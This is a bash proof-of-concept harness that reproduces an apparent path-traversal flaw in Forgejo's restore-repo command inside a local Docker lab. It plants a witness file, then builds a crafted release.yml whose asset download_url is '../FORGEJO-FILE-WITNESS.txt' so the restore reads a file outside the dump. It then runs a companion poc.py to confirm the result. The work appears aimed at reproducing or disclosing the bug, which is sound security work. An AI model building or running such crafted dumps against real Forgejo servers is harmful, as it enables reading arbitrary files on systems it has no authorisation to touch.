#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

export COMPOSE_PROJECT_NAME="${COMPOSE_PROJECT_NAME:-forgejo-restore-file-open}"
export PYTHONUNBUFFERED=1

BASE="${1:-http://127.0.0.1:19340}"
IMAGE="codeberg.org/forgejo/forgejo:16.0.5"
WITNESS="FORGEJO-RESTORE-FILE-OPEN-WITNESS"
DECOY="INSIDE-DUMP-NOT-HOST"
LABEL="forgejo-restore-file-open"

chmod +x poc.py

down() {
  echo "== docker compose down =="
  docker compose -p "${COMPOSE_PROJECT_NAME}" down -v --remove-orphans || true
}

trap down EXIT

fail_run() {
  echo "FAIL ${LABEL} $* ${WITNESS}" | tee poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 forgejo || true
  exit 1
}

echo "== reset leftover volume =="
down
trap down EXIT

echo "== docker compose up (${IMAGE}, loopback :19340) =="
up_ok=0
for attempt in $(seq 1 15); do
  if docker compose -p "${COMPOSE_PROJECT_NAME}" up -d --build; then
    up_ok=1
    break
  fi
  echo "IOC compose-up-retry attempt=${attempt}"
  sleep 20
  down
  trap down EXIT
done
if [[ "${up_ok}" != 1 ]]; then
  fail_run "docker compose up"
fi

echo "== wait for Forgejo =="
ok=0
for i in $(seq 1 90); do
  code="$(curl -s -o /tmp/forgejo-restore-file-open-ver -w '%{http_code}' --max-time 5 "${BASE}/api/v1/version" || true)"
  if [[ "${code}" == "200" ]]; then
    echo "IOC forgejo-up http=${code}"
    ok=1
    break
  fi
  echo "IOC wait i=${i} http=${code}"
  sleep 3
done
if [[ "${ok}" != 1 ]]; then
  fail_run "Forgejo did not become ready on ${BASE}"
fi

cid="$(docker compose -p "${COMPOSE_PROJECT_NAME}" ps -q forgejo)"
echo "== seed admin =="
docker exec -u git "${cid}" forgejo admin user create \
  --admin \
  --username labadmin \
  --password 'LabPass123!' \
  --email labadmin@localhost.invalid \
  --must-change-password=false >/dev/null 2>&1 || true

echo "== plant host witness next to dump (reached via ../) =="
docker exec "${cid}" sh -c "printf '${WITNESS}\n' > /data/FORGEJO-FILE-WITNESS.txt && chmod 644 /data/FORGEJO-FILE-WITNESS.txt && chown git:git /data/FORGEJO-FILE-WITNESS.txt"
docker exec "${cid}" sh -c 'wc -c /data/FORGEJO-FILE-WITNESS.txt; cat /data/FORGEJO-FILE-WITNESS.txt'

echo "== prepare dump (repo.yml + release.yml + git + in-dump decoy) =="
docker exec "${cid}" sh -c "mkdir -p /data/restore-dump/git /tmp/lab-dump-src"
docker exec "${cid}" sh -c "printf '${DECOY}\n' > /data/restore-dump/FORGEJO-FILE-WITNESS.txt"
docker exec "${cid}" sh -c 'cat > /data/restore-dump/repo.yml <<EOF
name: "restored"
owner: "labadmin"
description: "lab restore dump"
website: ""
clone_addr: ""
original_url: "http://127.0.0.1/lab.git"
is_private: "false"
service_type: "1"
wiki: "false"
issues: "false"
milestones: "false"
labels: "false"
releases: "true"
comments: "false"
pulls: "false"
assets: "true"
default_branch: "main"
EOF'
docker exec "${cid}" sh -c 'cat > /data/restore-dump/release.yml <<EOF
- tag_name: v1.0
  target_commitish: main
  name: lab-release
  body: lab restore asset
  draft: false
  prerelease: false
  publisher_id: 1
  publisher_name: labadmin
  publisher_email: labadmin@localhost.invalid
  created: 2026-01-01T00:00:00Z
  published: 2026-01-01T00:00:00Z
  assets:
    - name: witness.txt
      size: 34
      download_count: 0
      download_url: ../FORGEJO-FILE-WITNESS.txt
EOF'
docker exec "${cid}" sh -c '
set -eu
SRC=/tmp/lab-dump-src
DUMP=/data/restore-dump
rm -rf "$SRC" "$DUMP/git"
mkdir -p "$SRC"
git init -b main "$SRC"
git -C "$SRC" config user.email lab@localhost.invalid
git -C "$SRC" config user.name lab
printf "lab dump\n" > "$SRC/README.md"
git -C "$SRC" add README.md
git -C "$SRC" -c user.email=lab@localhost.invalid -c user.name=lab commit -m init
git -C "$SRC" branch -M main
git -C "$SRC" tag v1.0
git clone --mirror "$SRC" "$DUMP/git"
chown -R git:git "$DUMP" /data/FORGEJO-FILE-WITNESS.txt
ls -la "$DUMP" "$DUMP/git" | head -40
printf "IOC host-witness "
cat /data/FORGEJO-FILE-WITNESS.txt
printf "IOC dump-decoy "
cat "$DUMP/FORGEJO-FILE-WITNESS.txt"
printf "IOC download_url "
grep download_url "$DUMP/release.yml"
'

echo "== forgejo restore-repo =="
set +e
restore_out="$(docker exec -u git "${cid}" forgejo restore-repo \
  --repo_dir /data/restore-dump \
  --owner_name labadmin \
  --repo_name restored \
  --units releases,release_assets 2>&1)"
restore_rc=$?
set -e
echo "${restore_out}"
echo "IOC restore-rc=${restore_rc}"
if [[ "${restore_rc}" != 0 ]]; then
  {
    echo "IOC restore-rc=${restore_rc}"
    echo "${restore_out}" | sed 's/^/IOC restore-out /'
    echo "FAIL ${LABEL} restore-repo rc=${restore_rc} ${WITNESS}"
  } | tee poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 forgejo | tee -a poc-last-run.txt || true
  exit 1
fi

echo "== poc.py =="
set +e
{
  echo "IOC restore-rc=${restore_rc}"
  echo "${restore_out}" | sed 's/^/IOC restore-out /'
  python3 poc.py "${BASE}"
} | tee poc-last-run.txt
rc=${PIPESTATUS[0]}
set -e
if [[ "${rc}" != 0 ]]; then
  echo "== forgejo logs (tail) ==" | tee -a poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 forgejo | tee -a poc-last-run.txt || true
  if ! tail -n1 poc-last-run.txt 2>/dev/null | grep -qE '^(SUCCESS|FAIL) '; then
    echo "FAIL ${LABEL} poc exit=${rc} ${WITNESS}" >> poc-last-run.txt
  fi
fi
exit "${rc}"
